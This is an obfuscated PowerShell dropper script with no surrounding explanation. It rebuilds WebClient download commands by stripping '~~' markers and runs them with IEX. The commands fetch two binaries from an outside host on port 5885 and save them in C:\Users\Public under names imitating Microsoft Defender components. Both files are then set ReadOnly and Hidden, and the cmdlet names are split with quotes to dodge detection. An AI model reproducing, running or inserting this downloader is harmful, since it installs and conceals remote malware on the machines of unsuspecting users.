$splited = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/64.signed','C:\Users\Public\MSASC.exe')"
$unsplited = $splited.Replace("~~","")
IEX $unsplited
Ge't-It'em ('C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MS'+'AS'+'C.e'+'xe') | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
$split = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/MS_ASC64_1.signed','C:\Users\Public\MSASCuiL.exe')"
$unsplit = $split.Replace("~~","")
IEX $unsplit
Ge't-It'em ('C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe') | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
